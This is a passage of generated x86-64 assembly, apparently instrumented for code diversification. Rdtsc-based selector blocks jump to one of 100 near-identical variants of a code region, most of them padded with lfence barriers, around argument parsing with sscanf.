	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 77
.Lmain_win6_var77:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 78
.Lmain_win6_var78:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 79
.Lmain_win6_var79:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 80
.Lmain_win6_var80:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 81
.Lmain_win6_var81:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 82
.Lmain_win6_var82:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 83
.Lmain_win6_var83:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 84
.Lmain_win6_var84:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 85
.Lmain_win6_var85:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 86
.Lmain_win6_var86:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 87
.Lmain_win6_var87:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 88
.Lmain_win6_var88:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 89
.Lmain_win6_var89:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 90
.Lmain_win6_var90:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 91
.Lmain_win6_var91:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 92
.Lmain_win6_var92:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 93
.Lmain_win6_var93:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 94
.Lmain_win6_var94:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 95
.Lmain_win6_var95:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 96
.Lmain_win6_var96:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 97
.Lmain_win6_var97:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 98
.Lmain_win6_var98:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 99
.Lmain_win6_var99:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
.Lmain_win6_continue:
	addq	$32, %rsp
	leaq	.LC1(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
.L32:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win5_var0
	cmpl	$1, %eax
	je	.Lmain_win5_var1
	cmpl	$2, %eax
	je	.Lmain_win5_var2
	cmpl	$3, %eax
	je	.Lmain_win5_var3
	cmpl	$4, %eax
	je	.Lmain_win5_var4
	cmpl	$5, %eax
	je	.Lmain_win5_var5
	cmpl	$6, %eax
	je	.Lmain_win5_var6
	cmpl	$7, %eax
	je	.Lmain_win5_var7
	cmpl	$8, %eax
	je	.Lmain_win5_var8
	cmpl	$9, %eax
	je	.Lmain_win5_var9
	cmpl	$10, %eax
	je	.Lmain_win5_var10
	cmpl	$11, %eax
	je	.Lmain_win5_var11
	cmpl	$12, %eax
	je	.Lmain_win5_var12
	cmpl	$13, %eax
	je	.Lmain_win5_var13
	cmpl	$14, %eax
	je	.Lmain_win5_var14
	cmpl	$15, %eax
	je	.Lmain_win5_var15
	cmpl	$16, %eax
	je	.Lmain_win5_var16
	cmpl	$17, %eax
	je	.Lmain_win5_var17
	cmpl	$18, %eax
	je	.Lmain_win5_var18
	cmpl	$19, %eax
	je	.Lmain_win5_var19
	cmpl	$20, %eax
	je	.Lmain_win5_var20
	cmpl	$21, %eax
	je	.Lmain_win5_var21
	cmpl	$22, %eax
	je	.Lmain_win5_var22
	cmpl	$23, %eax
	je	.Lmain_win5_var23
	cmpl	$24, %eax
	je	.Lmain_win5_var24
	cmpl	$25, %eax
	je	.Lmain_win5_var25
	cmpl	$26, %eax
	je	.Lmain_win5_var26
	cmpl	$27, %eax
	je	.Lmain_win5_var27
	cmpl	$28, %eax
	je	.Lmain_win5_var28
	cmpl	$29, %eax
	je	.Lmain_win5_var29
	cmpl	$30, %eax
	je	.Lmain_win5_var30
	cmpl	$31, %eax
	je	.Lmain_win5_var31
	cmpl	$32, %eax
	je	.Lmain_win5_var32
	cmpl	$33, %eax
	je	.Lmain_win5_var33
	cmpl	$34, %eax
	je	.Lmain_win5_var34
	cmpl	$35, %eax
	je	.Lmain_win5_var35
	cmpl	$36, %eax
	je	.Lmain_win5_var36
	cmpl	$37, %eax
	je	.Lmain_win5_var37
	cmpl	$38, %eax
	je	.Lmain_win5_var38
	cmpl	$39, %eax
	je	.Lmain_win5_var39
	cmpl	$40, %eax
	je	.Lmain_win5_var40
	cmpl	$41, %eax
	je	.Lmain_win5_var41
	cmpl	$42, %eax
	je	.Lmain_win5_var42
	cmpl	$43, %eax
	je	.Lmain_win5_var43
	cmpl	$44, %eax
	je	.Lmain_win5_var44
	cmpl	$45, %eax
	je	.Lmain_win5_var45
	cmpl	$46, %eax
	je	.Lmain_win5_var46
	cmpl	$47, %eax
	je	.Lmain_win5_var47
	cmpl	$48, %eax
	je	.Lmain_win5_var48
	cmpl	$49, %eax
	je	.Lmain_win5_var49
	cmpl	$50, %eax
	je	.Lmain_win5_var50
	cmpl	$51, %eax
	je	.Lmain_win5_var51
	cmpl	$52, %eax
	je	.Lmain_win5_var52
	cmpl	$53, %eax
	je	.Lmain_win5_var53
	cmpl	$54, %eax
	je	.Lmain_win5_var54
	cmpl	$55, %eax
	je	.Lmain_win5_var55
	cmpl	$56, %eax
	je	.Lmain_win5_var56
	cmpl	$57, %eax
	je	.Lmain_win5_var57
	cmpl	$58, %eax
	je	.Lmain_win5_var58
	cmpl	$59, %eax
	je	.Lmain_win5_var59
	cmpl	$60, %eax
	je	.Lmain_win5_var60
	cmpl	$61, %eax
	je	.Lmain_win5_var61
	cmpl	$62, %eax
	je	.Lmain_win5_var62
	cmpl	$63, %eax
	je	.Lmain_win5_var63
	cmpl	$64, %eax
	je	.Lmain_win5_var64
	cmpl	$65, %eax
	je	.Lmain_win5_var65
	cmpl	$66, %eax
	je	.Lmain_win5_var66
	cmpl	$67, %eax
	je	.Lmain_win5_var67
	cmpl	$68, %eax
	je	.Lmain_win5_var68
	cmpl	$69, %eax
	je	.Lmain_win5_var69
	cmpl	$70, %eax
	je	.Lmain_win5_var70
	cmpl	$71, %eax
	je	.Lmain_win5_var71
	cmpl	$72, %eax
	je	.Lmain_win5_var72
	cmpl	$73, %eax
	je	.Lmain_win5_var73
	cmpl	$74, %eax
	je	.Lmain_win5_var74
	cmpl	$75, %eax
	je	.Lmain_win5_var75
	cmpl	$76, %eax
	je	.Lmain_win5_var76
	cmpl	$77, %eax
	je	.Lmain_win5_var77
	cmpl	$78, %eax
	je	.Lmain_win5_var78
	cmpl	$79, %eax
	je	.Lmain_win5_var79
	cmpl	$80, %eax
	je	.Lmain_win5_var80
	cmpl	$81, %eax
	je	.Lmain_win5_var81
	cmpl	$82, %eax
	je	.Lmain_win5_var82
	cmpl	$83, %eax
	je	.Lmain_win5_var83
	cmpl	$84, %eax
	je	.Lmain_win5_var84
	cmpl	$85, %eax
	je	.Lmain_win5_var85
	cmpl	$86, %eax
	je	.Lmain_win5_var86
	cmpl	$87, %eax
	je	.Lmain_win5_var87
	cmpl	$88, %eax
	je	.Lmain_win5_var88
	cmpl	$89, %eax
	je	.Lmain_win5_var89
	cmpl	$90, %eax
	je	.Lmain_win5_var90
	cmpl	$91, %eax
	je	.Lmain_win5_var91
	cmpl	$92, %eax
	je	.Lmain_win5_var92
	cmpl	$93, %eax
	je	.Lmain_win5_var93
	cmpl	$94, %eax
	je	.Lmain_win5_var94
	cmpl	$95, %eax
	je	.Lmain_win5_var95
	cmpl	$96, %eax
	je	.Lmain_win5_var96
	cmpl	$97, %eax
	je	.Lmain_win5_var97
	cmpl	$98, %eax
	je	.Lmain_win5_var98
	cmpl	$99, %eax
	je	.Lmain_win5_var99
	jmp	.Lmain_win5_var0
## Variant 0
.Lmain_win5_var0:
	popq	%rax
	cmpl	$3, -52(%rbp)
	jle	.L33
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 1
.Lmain_win5_var1:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 2
.Lmain_win5_var2:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 3
.Lmain_win5_var3:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 4
.Lmain_win5_var4:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 5
.Lmain_win5_var5:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 6
.Lmain_win5_var6:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 7
.Lmain_win5_var7:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 8
.Lmain_win5_var8:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 9
.Lmain_win5_var9:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 10
.Lmain_win5_var10:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 11
.Lmain_win5_var11:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 12
.Lmain_win5_var12:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 13
.Lmain_win5_var13:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 14
.Lmain_win5_var14:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 15
.Lmain_win5_var15:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 16
.Lmain_win5_var16:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 17
.Lmain_win5_var17:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 18
.Lmain_win5_var18:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 19
.Lmain_win5_var19:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 20
.Lmain_win5_var20:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 21
.Lmain_win5_var21:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 22
.Lmain_win5_var22:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 23
.Lmain_win5_var23:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 24
.Lmain_win5_var24:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 25
.Lmain_win5_var25:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 26
.Lmain_win5_var26:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 27
.Lmain_win5_var27:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 28
.Lmain_win5_var28:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 29
.Lmain_win5_var29:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 30
.Lmain_win5_var30:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 31
.Lmain_win5_var31:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 32
.Lmain_win5_var32:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 33
.Lmain_win5_var33:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 34
.Lmain_win5_var34:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 35
.Lmain_win5_var35:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 36
.Lmain_win5_var36:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 37
.Lmain_win5_var37:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 38
.Lmain_win5_var38:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 39
.Lmain_win5_var39:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 40
.Lmain_win5_var40:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 41
.Lmain_win5_var41:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 42
.Lmain_win5_var42:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 43
.Lmain_win5_var43:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 44
.Lmain_win5_var44:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 45
.Lmain_win5_var45:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 46
.Lmain_win5_var46:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 47
.Lmain_win5_var47:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 48
.Lmain_win5_var48:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 49
.Lmain_win5_var49:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 50
.Lmain_win5_var50:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
